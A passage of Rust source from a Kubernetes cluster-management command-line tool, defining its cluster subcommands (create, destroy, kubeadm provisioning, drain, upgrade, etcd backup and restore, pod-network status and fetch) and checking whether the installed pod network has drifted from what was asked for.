    // same boundary `drain`/`uncordon` already use, so this works for every
    // cluster family rather than only the ones with a container to exec into.
    let observed = observed_profile_via_kubectl(&kubeconfig);

    match &record {
        Some(r) => {
            println!("desired   {} {}", r.cni, r.version);
            // kindnet (cni: default) ships in the node image, so it has no
            // dataplane, managed MTU or fetched-artefact digest — those fields
            // stay at their defaults and printing them would be noise (and an
            // empty `sha256:`). Only show what was actually recorded.
            if !r.dataplane.is_empty() {
                println!("  dataplane   {}", r.dataplane);
            }
            println!("  kube-proxy  {}", r.kube_proxy);
            if r.mtu != 0 {
                println!("  {:<12}{}", "mtu", r.mtu);
            }
            println!("  pod CIDR    {}", r.pod_subnet);
            if !r.artefact_sha256.is_empty() {
                println!("  artefact    sha256:{}", r.artefact_sha256);
            }
            if r.multus {
                println!("  {:<12}installed", "multus");
            }
            if r.hubble {
                println!("  {:<12}installed", "hubble");
            }
        }
        None => println!(
            "desired   {}",
            super::po::t(
                "unknown — this engine has no record of installing a pod network on this \
                 cluster (it was created with `cni: none`, by an older release, or by hand)"
            )
        ),
    }
    println!(
        "observed  {}",
        if observed.is_empty() {
            super::po::t("none — no pod-network agent DaemonSet found in the cluster").to_string()
        } else {
            observed.clone()
        }
    );

    // The one thing this command exists to catch.
    let desired = record.as_ref().map(|r| r.cni.clone()).unwrap_or_default();
    if !desired.is_empty() && !observed.is_empty() && desired != observed {
        return Err(Error::coded(
            6703,
            Error::Unavailable(super::po::tf(
                "drift: this engine installed '{desired}' and the cluster is running \
                 '{observed}'. Nothing was changed. Either the pod network was replaced outside \
                 this engine, or the record belongs to a different cluster of the same name",
                &[("desired", &desired), ("observed", &observed)],
            )),
        ));
    }
    if !desired.is_empty() && observed.is_empty() {
        return Err(Error::coded(
            6704,
            Error::Unavailable(super::po::tf(
                "drift: this engine installed '{desired}' and the cluster has no pod-network \
                 agent at all — the DaemonSet is gone. Pods will not get addresses. Re-run \
                 `delonix cluster apply` with the same manifest: the install path is idempotent \
                 and will reinstate it",
                &[("desired", &desired)],
            )),
        ));
    }
    Ok(())
}

/// Which pod network the live cluster runs, asked through the cached
/// kubeconfig rather than over SSH — so it answers for a kind-mode cluster
/// too, and needs no reachable control-plane host.
fn observed_profile_via_kubectl(kubeconfig: &std::path::Path) -> String {
    let out = Command::new("kubectl")
        .env("KUBECONFIG", kubeconfig)
        .args(["get", "daemonset", "--all-namespaces", "-o", "name"])
        .output();
    let text = match out {
        Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).into_owned(),
        _ => return String::new(),
    };
    for (needle, name) in [
        ("cilium", "cilium"),
        ("calico-node", "calico"),
        ("kube-flannel", "flannel"),
        ("kindnet", "default"),
    ] {
        if text.contains(needle) {
            return name.to_string();
        }
    }
    String::new()
}

/// Refuses a cluster CIDR that overlaps a network this host already uses.
///
/// Best-effort by design: the list of known networks is what the engine can
/// read without asking anyone (its own declared networks). A network it cannot
/// enumerate is not a reason to refuse the cluster — so a failure to read is
/// skipped, never turned into a false conflict.
fn check_env_overlap(plan: &super::net_profiles::NetworkPlan) -> Result<()> {
    let mut known: Vec<(String, String)> = Vec::new();
    if let Ok(store) = delonix_sdn::NetworkStore::open(state_root()) {
        if let Ok(nets) = store.list() {
            for n in nets {
                known.push((format!("network \"{}\"", n.name), n.subnet));
            }
        }
    }
    super::net_profiles::check_env_overlap(plan, &known)
}

fn target_for(host: &HostSpec, ssh: &SshSpec) -> SshTarget {
    SshTarget {
        host: host.ip.clone(),
        user: ssh.user.clone(),
        key: ssh.key.clone(),
        port: ssh.port,
    }
}

// `Kubeadm` is larger than `Apply` (many optional provisioning flags) —
// same rationale as the `#[allow]` already used in `VmCmd`/`Cmd` (a CLI enum
// parsed once per invocation, not a hot path).
#[allow(clippy::large_enum_variant)]
#[derive(Subcommand)]
pub enum ClusterCmd {
    /// Run `kubectl` against a cluster BY NAME: `delonix cluster <name> get pods`.
    ///
    /// Everything after the name goes to `kubectl` untouched.
    // Deliberately a passthrough and not a reimplementation. `run_kubectl`'s own
    // doc comment already states the rule this follows -- shell out to the host's
    // real client, never reimplement it -- and the reason is the same one that
    // makes `cluster ls` print `-` instead of guessing: a table that is ALMOST
    // `kubectl`'s, subtly different per Kind, is worse than no table.
    //
    // What this removes is the real friction, which was never the printing: it
    // was finding and exporting the right KUBECONFIG for the cluster you meant.
    #[command(external_subcommand)]
    Kubectl(Vec<String>),
    /// List this host's clusters — kind-mode AND VM-based.
    ///
    /// Shows what is up; `-A` adds the ones whose every node is stopped.
    // Why it came back: `cluster` was the only kind left without an `ls` (`vm`,
    // `image`, `container`, `network` and `volume` all kept theirs), and the
    // generic `get clusters` it had been folded into saw kind-mode nodes only.
    // Kept as a `//` comment: this is the reason for the command, not help text
    // the user needs at the prompt (and every help line is a string to translate).
    Ls {
        /// Also show clusters whose every node is stopped.
        #[arg(short = 'A', long)]
        all: bool,
    },
    /// Stop every node of a kind-mode cluster at once — no rebuild, no state lost.
    ///
    /// The container-level `container stop` already exists per node; this is
    /// the cluster-wide convenience `container`'s own multi-id form doesn't
    /// give you (it takes explicit ids, never a label). `cluster ls -A` is
    /// where a fully-stopped cluster shows up afterwards.
    Stop {
        /// Cluster name. Omit when there is only one.
        #[arg(add = ArgValueCandidates::new(super::complete::clusters))]
        name: Option<String>,
    },
    /// Start every node of a stopped kind-mode cluster back up.
    Start {
        /// Cluster name. Omit when there is only one.
        #[arg(add = ArgValueCandidates::new(super::complete::clusters))]
        name: Option<String>,
    },
    /// Remove a cluster entirely — nodes, kubeconfig, `~/.kube/config` entry.
    ///
    /// Serves BOTH families: a kind-mode cluster, whose nodes are
    /// containers, and a VM-provisioned one (`cluster kubeadm` / `mode: vm`),
    /// whose nodes are VMs — its load balancer and etcd members included.
    ///
    /// What becomes of the NETWORK is the one real difference, and the rule
    /// is the same in both families: whoever created it owns it. A kind-mode
    /// cluster's `dlx-<name>` was made FOR it and goes with it. A VM cluster
    /// built WITHOUT `--network` was given one of its own, named
    /// `<cluster>-<hash>`, and that one goes with it too. A network you named
    /// in `--network` is yours, and is left alone. Volumes are never touched
    /// either, on purpose, same as `docker`.
    ///
    /// A cluster whose nodes are already gone is still removable by name:
    /// what gets collected is the state directory, the exported kubeconfig
    /// and the matching context — the same thing `cluster prune <name>` does.
    ///
    /// Omitting the name resolves among KIND-MODE clusters only, so name a
    /// VM cluster explicitly. For a kind-mode cluster this is the same
    /// removal `delonix delete clusters <name>` already does (the generic
    /// kubectl-style verb this engine gives every Kind) — just the more
    /// discoverable spelling inside `cluster --help`, with a confirmation
    /// prompt `delete` does not have. For a VM-provisioned one it is the
    /// ONLY verb that tears the cluster down: `cmd_delete` hands straight
    /// to kind-mode's `delete` and has no VM branch at all.
    Destroy {
        /// Cluster name. Omit when there is only one.
        #[arg(add = ArgValueCandidates::new(super::complete::destroyable_clusters))]
        name: Option<String>,
        /// Skip the confirmation prompt (REQUIRED when stdin is not a terminal).
        #[arg(short = 'f', long)]
        force: bool,
    },
    /// Initialize a project with the cluster manifests (kind/vm/ssh).
    ///
    /// Files ALREADY FILLED IN (images included), ready to use without editing
    /// anything.
    Init {
        /// Project directory (default: the current one).
        #[arg(value_hint = clap::ValueHint::DirPath, default_value = ".")]
        dir: PathBuf,
        /// Project name (default: the directory name).
        #[arg(long)]
        name: Option<String>,
        /// Image to use. Omit = fills in with the default image.
        #[arg(long, add = ArgValueCandidates::new(super::complete::images))]
        image: Option<String>,
        /// Overwrite existing files.
        #[arg(long)]
        force: bool,
    },
    /// Create a local Kubernetes cluster **without a manifest and without Docker**.
    ///
    /// Native kind mode: starts the `kindest/node` nodes in the Delonix engine
    /// itself and bootstraps them with `kubeadm`. No flags = 1 control-plane
    /// ready to use.
    Create {
        /// Cluster name (prefix of the nodes and the kubeconfig). Omit = invents
        /// one (Angolan king + place), so two `create`s in a row do not collide.
        #[arg(long)]
        name: Option<String>,
        /// Host port for the apiserver. Omit = delonix picks a free one
        /// (tries 6443; if taken by another cluster, uses a high one).
        #[arg(long)]
        api_port: Option<u16>,
        /// Worker nodes to join (0 = control-plane only, untainted — schedules everything).
        #[arg(long, default_value_t = 0)]
        workers: u32,
        /// Cluster control-planes (default 1). More than 1 requires a stable
        /// endpoint in front of them (LB) — see the error if you ask for >1.
        #[arg(long, default_value_t = 1)]
        control_planes: u32,
        /// Node image (default: `kindest/node` pinned by digest).
        #[arg(long, add = ArgValueCandidates::new(super::complete::images))]
        image: Option<String>,
        #[arg(long, default_value = "10.244.0.0/16")]
        pod_subnet: String,
        #[arg(long, default_value = "10.96.0.0/12")]
        service_subnet: String,
        /// `default` (kindnet, from the image itself) or `none` (node stays NotReady
        /// until you apply yours — plain kubeadm behavior).
        #[arg(long, default_value = "default", value_parser = ["default", "none"])]
        cni: String,
    },
    /// Reclaim the state of clusters that have no nodes left.
    ///
    /// A cluster exists as long as containers carry its label — `cluster ls`
    /// derives it that way instead of keeping a registry that could drift. So a
    /// cluster whose nodes went away by another route (`container rm`, `system
    /// prune`, a lost rootfs) leaves its directory, its exported kubeconfig and
    /// its `~/.kube/config` context behind, and nothing ever collects them.
    ///
    /// That context is the reason this is not cosmetic: it still points at
    /// `127.0.0.1:<port>`, and by now that port may answer for something else.
    ///
    /// **A cluster with nodes is never touched, stopped ones included** — for
    /// that there is `cluster destroy` (or `delete clusters <name>`, the same
    /// removal without the prompt), which takes a name on purpose.
    ///
    /// With no NAMES this collects every orphan at once; naming one collects
    /// that one and leaves the others exactly as they are.
    Prune {
        /// Orphans to collect (omit = every cluster with no nodes left).
        #[arg(add = ArgValueCandidates::new(super::complete::cluster_leftovers))]
        names: Vec<String>,
        /// Skip the confirmation prompt (REQUIRED when stdin is not a terminal).
        #[arg(short = 'f', long)]
        force: bool,
    },
    /// Load local images into a kind-mode cluster's nodes, **without a registry**.
    ///
    /// The equivalent of `kind load docker-image`: packs each image from the
    /// local store and imports it into every running node's containerd.
    Load {
        /// Images to load (`repo:tag`, as they appear in `delonix image ls`).
        #[arg(required = true, num_args = 1.., add = ArgValueCandidates::new(super::complete::images))]
        images: Vec<String>,
        /// Cluster name. Omit when there is only one — with several, this says which.
        #[arg(long, add = ArgValueCandidates::new(super::complete::clusters))]
        name: Option<String>,
    },
    /// Generate a Kubernetes manifest from a container/pod already running locally.
    ///
    /// `kube generate` — the "ran it locally, now give me the YAML for k8s"
    /// path (equivalent to `podman generate kube`).
    Kube {
        #[command(subcommand)]
        action: super::kube::KubeCmd,
    },
    /// Apply the `kind: KubernetesCluster` document(s) of a manifest.
    Apply {
        #[arg(value_hint = clap::ValueHint::FilePath, short = 'f', long = "file")]
        file: Option<PathBuf>,
        /// `delonix-cri` binary to install on the nodes. Omit = the one next to
        /// `delonix`, else the release asset of this version.
        #[arg(value_hint = clap::ValueHint::FilePath, long = "cri-bin")]
        cri_bin: Option<PathBuf>,
    },
    /// Provision VMs (golden VM image) + `kubeadm` bootstrap.
    ///
    /// From zero to a working cluster, without writing a manifest by hand.
    Kubeadm {
        /// Cluster name (used for `<name>-cp1`/`<name>-w1` VM names and the
        /// kubeconfig context). Omit for an auto-generated Angolan name
        /// (`<king>-<place>-NN`) — same pattern as auto-named containers and
        /// `cluster create` (kind mode).
        #[arg(long)]
        name: Option<String>,
        #[arg(long, default_value_t = 1)]
        control_plane: u32,
        #[arg(long, default_value_t = 2)]
        workers: u32,
        /// Tag of the golden VM image (`delonix vm image ls`). Omit = uses the
        /// only local image that exists.
        #[arg(long = "vm-image", add = ArgValueCandidates::new(super::complete::vm_images))]
        vm_image: Option<String>,
        /// Network the nodes attach to. Omit and the cluster gets its OWN,
        /// created here and named `<cluster>-<hash>` — and removed again by
        /// `cluster destroy`. Name one that already exists (`delonix network
        /// create`) to attach to it instead; that one is never removed, because
        /// you created it.
        #[arg(long, add = ArgValueCandidates::new(super::complete::networks))]
        network: Option<String>,
        /// Private SSH key to use. Omit = generates a new ed25519 pair in
        /// `<root>/clusters/<name>/id_ed25519`.
        #[arg(value_hint = clap::ValueHint::FilePath, long = "ssh-key")]
        ssh_key: Option<PathBuf>,
        #[arg(long, default_value_t = 2)]
        vcpus: u32,
        #[arg(long, default_value = "2G")]
        memory: String,
        #[arg(long = "k8s-version")]
        k8s_version: Option<String>,
        #[arg(long, default_value = "10.244.0.0/16")]
        pod_subnet: String,
        #[arg(long, default_value = "10.96.0.0/12")]
        service_subnet: String,
        /// Pod network. `default` = the engine's node-local bridge, which only
        /// serves a ONE-node cluster: with more nodes it is refused before any VM
        /// is created. `none` = install nothing; every node stays NotReady until
        /// you apply your own CNI. `cilium`/`calico`/`flannel` = a selectable
        /// profile, pinned to a version and an artefact digest, installed and
        /// waited for by the bootstrap itself (`delonix cluster network
        /// profiles` lists them with their support level).
        #[arg(long, default_value = "default", value_parser = CNI_CHOICES.to_vec())]
        cni: String,
        /// Encapsulation / forwarding mode of the chosen profile. Omit for its
        /// default (`vxlan`, the only mode that asks nothing of the network
        /// between the nodes). `spec.network.dataplane` in a manifest.
        #[arg(long = "cni-dataplane")]
        cni_dataplane: Option<String>,
        /// `iptables` (default), `ipvs`, or `none` — the last meaning the CNI
        /// replaces kube-proxy, which changes the `kubeadm init` call itself
        /// and so cannot be turned on later. `spec.network.kubeProxy`.
        #[arg(long = "kube-proxy")]
        kube_proxy: Option<String>,
        /// Pod MTU. Omit to compute it from the node MTU and the encapsulation
        /// overhead — an MTU that does not fit drops large packets in silence.
        #[arg(long = "cni-mtu")]
        cni_mtu: Option<u32>,
        /// The nodes' own MTU, when it is not 1500. Only used to compute and
        /// bound `--cni-mtu`.
        #[arg(long = "node-mtu")]
        node_mtu: Option<u32>,
        /// Node interface the dataplane should use, when autodetection is
        /// ambiguous. Omit to let the profile detect it.
        #[arg(long = "cni-interface")]
        cni_interface: Option<String>,
        /// Also install Multus, as an EXTENSION over the primary CNI
        /// (secondary pod interfaces through `NetworkAttachmentDefinition`).
        #[arg(long)]
        multus: bool,
        /// Also install Hubble (Cilium's observability component).
        #[arg(long)]
        hubble: bool,
        /// Acknowledge that the chosen profile is experimental in this
        /// release. Without it, an experimental profile is REFUSED (DX-1705)
        /// rather than silently used.
        #[arg(long = "experimental-cni")]
        experimental_cni: bool,
        /// Install the pod network from the local artefact cache only, never
        /// from the network. Populate it with `delonix cluster network fetch`.
        #[arg(long = "cni-offline")]
        cni_offline: bool,
        /// Seconds to wait for each VM to become reachable over SSH.
        #[arg(long, default_value_t = 300)]
        boot_timeout: u64,
        /// Wait for every node to report `Ready` (CNI up) before the command
        /// returns. It does NOT decide anything about the kubeconfig, despite
        /// the name: that is cached to `<root>/clusters/<name>-kubeconfig.yaml`
        /// and merged into `~/.kube/config` as its own cluster/user/context
        /// (named after `--name`) on EVERY run, as soon as `kubeadm init` has
        /// written it — so the commands a later failure tells you to run can
        /// actually run. A pod-network profile waits with or without this flag.
        #[arg(long)]
        copy_kubeconfig: bool,
        /// Auto-provision N more VMs as a DEDICATED etcd cluster (delonix
        /// generates its own CA + certs and bootstraps it) instead of the
        /// default `stacked` etcd (co-located with the control-planes). Use
        /// an ODD number for a well-defined quorum (3, 5, ...) — 1 is allowed
        /// for dev/test but has no HA (a single point of failure). Omit for
        /// today's default behavior.
        #[arg(long = "etcd-cluster")]
        etcd_cluster: Option<u32>,
        /// `delonix-cri` binary to install on the nodes. Omit = the one next to
        /// `delonix`, else the release asset of this version.
        #[arg(value_hint = clap::ValueHint::FilePath, long = "cri-bin")]
        cri_bin: Option<PathBuf>,
        /// Point `kubectl` at this cluster once it is up, so a bare `kubectl get
        /// nodes` reaches it. Without this flag a `~/.kube/config` that already
        /// selects a usable context keeps it — the cluster's context is merged
        /// either way, and the command to switch to it is printed.
        #[arg(long = "use-context")]
        use_context: bool,
    },
    /// Print a cluster's kubeconfig from the local cache (no live SSH).
    ///
    /// The same file `create`/`apply`/`kubeadm` already wrote and merged into
    /// `~/.kube/config` at creation time. Redirect or pipe it as needed.
    Kubeconfig {
        /// Cluster name. Omit when there is only one cached.
        #[arg(add = ArgValueCandidates::new(super::complete::cached_kubeconfigs))]
        name: Option<String>,
    },
    /// Is the control-plane answering, and is every node `Ready`?
    ///
    /// Only kind-mode clusters (the same boundary `kubeconfig`/`describe`
    /// already have) — an SSH-provisioned `cluster apply` target has no
    /// container to exec into. Exits non-zero on anything short of fully
    /// healthy: a `health` that returns 0 over a `NotReady` node is the
    /// dishonest reporting this repo's own audits exist to remove.
    Health {
        /// Cluster name. Omit when there is only one.
        name: Option<String>,
    },
    /// Inspect and prepare the pod-network profiles.
    ///
    /// What exists and at what support level, what a given cluster is
    /// ACTUALLY running (and whether that drifted from what was asked), and a
    /// verified pre-fetch of the install artefacts for an offline bootstrap.
    #[command(subcommand)]
    Network(NetworkCmd),
    /// Cordon a node and evict its pods.
    ///
    /// The manual step before touching a control-plane/worker host (upgrade,
    /// maintenance, decommission). A pure Kubernetes API operation: talks to
    /// the apiserver through the CACHED kubeconfig (the same file `cluster
    /// kubeconfig` prints), needs no SSH and no container to exec into —
    /// unlike `health`, this works identically for every cluster family
    /// (`resolve_kubeconfig_name` already treats kind-mode and SSH/kubeadm
    /// clusters the same). Shells out to the system `kubectl`, the same
    /// "never reinvent an existing client" rule `remote::ssh_run` already
    /// follows for `ssh`.
    Drain {
        /// Cluster name. Omit when there is only one cached.
        #[arg(long, add = ArgValueCandidates::new(super::complete::cached_kubeconfigs))]
        name: Option<String>,
        /// Kubernetes node name, as `kubectl get nodes` shows it.
        node: String,
        /// Also evict DaemonSet-managed pods (they would otherwise block the drain).
        #[arg(long, default_value_t = true)]
        ignore_daemonsets: bool,
        /// Also evict pods using an `emptyDir` volume (their data is lost).
        #[arg(long)]
        delete_emptydir_data: bool,
        /// Evict pods not managed by a controller too (bare Pods).
        #[arg(long)]
        force: bool,
        /// Give up waiting for eviction after this long (a `kubectl` duration, e.g. `5m`).
        #[arg(long)]
        timeout: Option<String>,
    },
    /// Mark a drained node schedulable again.
    Uncordon {
        /// Cluster name. Omit when there is only one cached.
        #[arg(long, add = ArgValueCandidates::new(super::complete::cached_kubeconfigs))]
        name: Option<String>,
        /// Kubernetes node name, as `kubectl get nodes` shows it.
        node: String,
    },
    /// Upgrade a `mode: ssh` cluster to a newer Kubernetes version, kubeadm-style.
    ///
    /// Mirrors kubeadm's own manual, one-node-at-a-time procedure — deliberately
    /// NOT an unattended whole-cluster cascade. With no NODE argument, upgrades
    /// the control-plane LEADER only (`spec.controlPlane.hosts[0]`, the one host
    /// `kubeadm upgrade apply` runs on); with `<NODE>`, upgrades that
    /// other control-plane or worker host (`kubeadm upgrade node`). Drains
    /// before and uncordons after each node automatically, unless `--no-drain`.
    Upgrade {
        /// Manifest with the `kind: KubernetesCluster` document (default: `./delonix-manifest.yaml`).
        #[arg(short = 'f', long, value_hint = clap::ValueHint::FilePath)]
        file: Option<PathBuf>,
        /// Target Kubernetes version, e.g. `1.32.1`.
        #[arg(long)]
        to: String,
        /// Upgrade this control-plane/worker host instead of the control-plane leader.
        node: Option<String>,
        /// Skip the automatic drain/uncordon around the node's own upgrade.
        #[arg(long)]
        no_drain: bool,
    },
    /// Back up etcd's keyspace to a local file (VM-provisioned clusters only).
    ///
    /// `etcd.mode: stacked` (the kubeadm default) only — `etcd.mode:
    /// external` is not supported yet, and is refused by name rather than
    /// attempted. Reads the control-plane's own `apiserver-etcd-client`
    /// certificate over SSH; nothing on the cluster is changed.
    Backup {
        /// Cluster name.
        #[arg(add = ArgValueCandidates::new(super::complete::clusters))]
        name: String,
        /// Destination file. Omit = `<root>/clusters/<name>/etcd-snapshot-<unix-time>.db`.
        #[arg(long, value_hint = clap::ValueHint::FilePath)]
        to: Option<PathBuf>,
    },
    /// Restore etcd's keyspace from a snapshot taken with `cluster backup`.
    ///
    /// **DESTRUCTIVE.** Stops the control-plane's etcd, moves its data
    /// directory aside (never deletes it), restores into a fresh one under
    /// the existing member's own identity, and brings etcd back up.
    /// Single stacked control-plane only — refuses above one.
    Restore {
        /// Cluster name.
        #[arg(add = ArgValueCandidates::new(super::complete::clusters))]
        name: String,
        /// Snapshot file written by `cluster backup`.
        #[arg(long, value_hint = clap::ValueHint::FilePath)]
        from: PathBuf,
    },
}

/// `delonix cluster network …` — the OPERATION side of a pod-network profile.
///
/// Three questions an operator has after a cluster exists, none of which had
/// an answer before: what can I install, what is this cluster actually
/// running, and can I install it without network reach.
#[derive(Subcommand)]
pub enum NetworkCmd {
    /// List the pod-network profiles, their pinned versions and their support
    /// level.
    ///
    /// Prints what this binary would install, not what a web page says: the
    /// version, the artefact digest, the dataplanes rendered, the kube-proxy
    /// modes, whether the profile enforces `NetworkPolicy`, and — for an
    /// experimental one — the reason it is experimental.
    Profiles,
    /// What pod network a cluster is ACTUALLY running, and whether it is what
    /// was asked for.
    ///
    /// Reads both sides: the record this engine wrote when it installed
    /// (desired) and the live cluster's own DaemonSets (observed). A
    /// divergence between them is reported as one, and exits non-zero — a
    /// status that returns 0 over a cluster running a different CNI than its
    /// manifest declares is the dishonest reporting this repo removes
    /// elsewhere.
    Status {
        /// Cluster name. Omit when there is only one cached.
        #[arg(add = ArgValueCandidates::new(super::complete::cached_kubeconfigs))]
        name: Option<String>,
    },
    /// Download and verify the install artefacts into the local cache, for an
    /// offline install later.
    ///
    /// Run it on a machine with reach, then copy `<root>/net-profiles/` to the
    /// machine that will bootstrap the cluster and pass `--cni-offline`. Every
    /// artefact is verified against the digest this release pins; a mismatch
    /// fails and caches nothing.
    Fetch {
        /// Which profile's artefacts. Omit for every profile this release
        /// ships, plus Multus.
        #[arg(long, value_parser = ["cilium", "calico", "flannel", "multus"])]
        cni: Option<String>,
    },
}

pub fn run(action: ClusterCmd) -> Result<()> {
    if let ClusterCmd::Init {
        dir,
        name,
        image,
        force,
    } = action
    {
        return cmd_init(super::scaffold::Target::Cluster, dir, name, image, force);
    }
    // Native kind mode — does not touch SSH/VMs nor need a manifest.
    match action {
        // Handled at the top of `run` (does a `return`).
        ClusterCmd::Init { .. } => unreachable!("tratado acima"),
        ClusterCmd::Create {
            ref name,
            api_port,
            workers,
            control_planes,
            ref image,
            ref pod_subnet,
            ref service_subnet,
            ref cni,
        } => {
            let (images, store) = super::util::open_stores()?;
            let name = match name {
                Some(n) => n.clone(),
                None => super::kindmode::random_cluster_name(&store)?,
            };
            return super::kindmode::create(
                &images,
                &store,
                &super::kindmode::KindCluster {
                    name,
                    image: image
                        .clone()
                        .unwrap_or_else(|| super::kindmode::DEFAULT_NODE_IMAGE.to_string()),
                    api_port,
                    pod_subnet: pod_subnet.clone(),
                    service_subnet: service_subnet.clone(),
                    control_planes,
                    cni: cni.clone(),
                    k8s_version: None,
                    workers,
                },
            );
        }
        ClusterCmd::Prune { ref names, force } => {
            let (_, store) = super::util::open_stores()?;
            // With names, this is also the gate: a name that is not an orphan
            // is refused HERE, before the prompt, so the question is never
            // asked about a set that does not match what was typed.
            let doomed = super::kindmode::prune_selection(&store, names)?;
            let preview = (!doomed.is_empty()).then(|| {
                super::po::tf(
                    "This will remove the leftover state of {n} cluster(s): {list}",
                    &[
                        ("n", &doomed.len().to_string()),
                        ("list", &doomed.join(", ")),
                    ],
                )
            });
            if !super::prune::confirm(
                force,
                super::po::t(
                    "`cluster prune` removes the state of clusters with no nodes left — pass \
                     --force to confirm when not on a terminal",
                ),
                preview,
                super::po::t(
                    "Also removes their kubeconfig and the matching `~/.kube/config` context. \
                     Continue? [y/N]",
                ),
            )? {
                return Ok(());
            }
            let n = super::kindmode::prune(&doomed)?;
            println!(
                "{}",
                super::po::tf("removed: {n} cluster leftover(s)", &[("n", &n.to_string())])
            );
            return Ok(());
        }
        ClusterCmd::Load {
            images: ref refs,
            ref name,
        } => {
            let (images, store) = super::util::open_stores()?;
            return super::kindmode::load(&images, &store, refs, name.as_deref());
        }
        ClusterCmd::Stop { ref name } => {
            let (_, store) = super::util::open_stores()?;
            return super::kindmode::stop(&store, name.as_deref());
        }
        ClusterCmd::Start { ref name } => {
            let (images, store) = super::util::open_stores()?;
            return super::kindmode::start(&images, &store, name.as_deref());
        }
        ClusterCmd::Destroy { ref name, force } => {
            // VM/SSH-provisioned clusters have no destroy of their own today
            // (KaaS capability audit, gap #10 — lived through directly while
            // tearing down this same audit's own test cluster by hand).
            // Checked only when a NAME is given: a VM-cluster match on an
            // omitted name would have to disambiguate against a kind-mode
            // cluster that might ALSO be "the only one", which is a second
            // decision this fix does not need to make to close the gap —
            // the omitted-name path keeps its exact previous behavior.
            if let Some(n) = name {
                let vms = cluster_vm_names(n)?;
                if !vms.is_empty() {
                    return destroy_vm_cluster(n, &vms, force);
                }
            }
            let (images, store) = super::util::open_stores()?;
            return super::kindmode::destroy(&images, &store, name.as_deref(), force);
        }
        _ => {}
    }
    match action {
        // Already handled above (native kind mode / init) — the top of `run` does a `return`.
        ClusterCmd::Create { .. }
        | ClusterCmd::Init { .. }
        | ClusterCmd::Load { .. }
        | ClusterCmd::Prune { .. }
        | ClusterCmd::Stop { .. }
        | ClusterCmd::Start { .. }
        | ClusterCmd::Destroy { .. } => {
            unreachable!("tratados acima")
        }
        ClusterCmd::Ls { all } => cmd_ls(all),
        ClusterCmd::Kubectl(args) => cmd_kubectl(&args),
        ClusterCmd::Kube { action } => super::kube::run(action),
        ClusterCmd::Apply { file, cri_bin } => {
            let path = manifest::resolve_path(file)?;
            let docs = manifest::load(&path)?;
            apply(&docs, cri_bin.as_deref())
        }
        ClusterCmd::Kubeadm {
            name,
            control_plane,
            workers,
            vm_image,
            network,
            ssh_key,
            vcpus,
            memory,
            k8s_version,
            pod_subnet,
            service_subnet,
            cni,
            cni_dataplane,
            kube_proxy,
            cni_mtu,
            node_mtu,
            cni_interface,
            multus,
            hubble,
            experimental_cni,
            cni_offline,
            boot_timeout,
            copy_kubeconfig,
            etcd_cluster,
            cri_bin,
            use_context,
        } => {
            let name = match name {
                Some(n) => n,
                None => random_kubeadm_cluster_name(&state_root())?,
            };
            // The flags and `spec.network` are the SAME block, built here
            // once — so a value the manifest accepts cannot be a value the
            // flag silently drops. Built BEFORE the refusal below, because
            // the refusal needs it.
            let net_block = NetworkBlock {
                dataplane: cni_dataplane,
                kube_proxy,
                mtu: cni_mtu,
                node_mtu,
                ip_family: None,
                interface: cni_interface,
                multus,
                hubble,
                experimental: experimental_cni,
                offline: cni_offline,
            };
            // BUG FIXED HERE, found by running it: the pod-network refusal
            // promises "Nothing was created", and creating the cluster's own
            // network before it made that promise FALSE — a refused
            // `cluster kubeadm` left a network behind, and leaked one more on
            // every retry.
            //
            // It asks the WHOLE network question and not just the CNI name,
            // because every part of it can refuse: the dataplane, the
            // kube-proxy mode, the MTU against the encapsulation, the CIDR
            // arithmetic, the support level. `net_profiles::validate` is pure
            // and `provision_and_apply` runs it again for its other callers,
            // so asking here costs nothing and keeps the promise the message
            // makes.
            super::net_profiles::validate(&network_request_parts(
                &cni,
                &net_block,
                &pod_subnet,
                &service_subnet,
                "vm",
                control_plane.saturating_add(workers),
            ))?;
            // `--network` omitted: the cluster gets its own, the same way kind
            // mode has always given each cluster one (`cluster_net`). Resolved
            // BEFORE `name` moves into the args below.
            let network = match network {
                Some(n) => n,
                None => ensure_cluster_network(&name)?,
            };
            provision_and_apply(ProvisionArgs {
                name,
                control_plane,
                workers,
                vm_image,
                network,
                ssh_key,
                vcpus,
                memory,
                k8s_version,
                pod_subnet,
                service_subnet,
                cni,
                net_block,
                boot_timeout,
                copy_kubeconfig,
                etcd_cluster,
                cri_bin,
                use_context,
            })
        }
        ClusterCmd::Network(cmd) => cmd_network(cmd),
        ClusterCmd::Kubeconfig { name } => cmd_kubeconfig(name),
        ClusterCmd::Health { name } => cmd_health(name.as_deref()),
        ClusterCmd::Drain {
            name,
            node,
            ignore_daemonsets,
            delete_emptydir_data,
            force,
            timeout,
        } => {
            let name = resolve_kubeconfig_name(name)?;
            drain_node(
                &name,
                &node,
                ignore_daemonsets,
                delete_emptydir_data,
                force,
                timeout.as_deref(),
            )
        }
        ClusterCmd::Uncordon { name, node } => {
            let name = resolve_kubeconfig_name(name)?;
            uncordon_node(&name, &node)
        }
        ClusterCmd::Upgrade {
            file,
            to,
            node,
            no_drain,
        } => cmd_upgrade(file, &to, node.as_deref(), no_drain),
        ClusterCmd::Backup { name, to } => super::etcd_backup::backup(&name, to),
        ClusterCmd::Restore { name, from } => super::etcd_backup::restore(&name, &from),
    }
}

/// Cluster names with a cached kubeconfig under the state root, sorted.
/// Covers BOTH cluster types — kind-mode (`kindmode::kubeconfig_path`) and
/// kubeadm/SSH (`fetch_kubeconfig`'s `dest`) write to the identical
/// `<root>/clusters/<name>-kubeconfig.yaml`, unlike `complete::clusters()`,
/// which only sees kind-mode's container labels. Best-effort: a missing or
/// unreadable directory is "none cached", not an error.
///
/// ONLY the state root, never `$HOME`: this is what `cluster kubeconfig`
/// resolves an omitted name against and then reads, so a name from
/// `~/.kube/config-<name>` would be picked (or counted) and then not found.
/// Mixing them made an empty `DELONIX_ROOT` report "2 cluster kubeconfigs
/// cached" on a host with real clusters.
fn cached_kubeconfig_names() -> Vec<String> {
    cached_kubeconfig_names_in(&state_root())
}

fn cached_kubeconfig_names_in(root: &Path) -> Vec<String> {
    let dir = root.join("clusters");
    let mut names: Vec<String> = std::fs::read_dir(&dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            e.file_name()
                .to_str()
                .and_then(|f| f.strip_suffix("-kubeconfig.yaml"))
                .map(String::from)
        })
        .collect();
    names.sort();
    names
}

/// Every name `kubeconfig_path_or_hint` can find credentials for: the cache
/// plus the kubeconfigs `delonix-deploy` writes, named after `cluster.name` —
/// the same second place that function reads. Listing only the cache made its
/// hint LIE: it said `delonix-dev` was unavailable on a machine where
